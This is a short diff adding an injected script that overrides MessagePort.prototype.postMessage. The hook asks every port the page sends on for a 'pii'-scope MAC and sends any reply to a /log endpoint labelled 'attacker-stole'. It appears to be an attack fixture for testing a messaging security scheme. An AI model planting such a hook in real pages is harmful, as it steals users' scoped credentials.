@@ -1,0 +1,11 @@
+<script>
+  // Replaces MessagePort.prototype.postMessage, and asks any port the head script
+  // sends on for the pii scope's MAC on a channel of its own.
+  const original = MessagePort.prototype.postMessage;
+  MessagePort.prototype.postMessage = function (message, transfer) {
+    const mint = new MessageChannel();
+    mint.port1.onmessage = (m) => fetch(location.origin + "/log?attacker-stole-" + encodeURIComponent(JSON.stringify(m.data)));
+    original.call(this, { scope: "pii" }, [mint.port2]);
+    return original.call(this, message, transfer);
+  };
+</script>
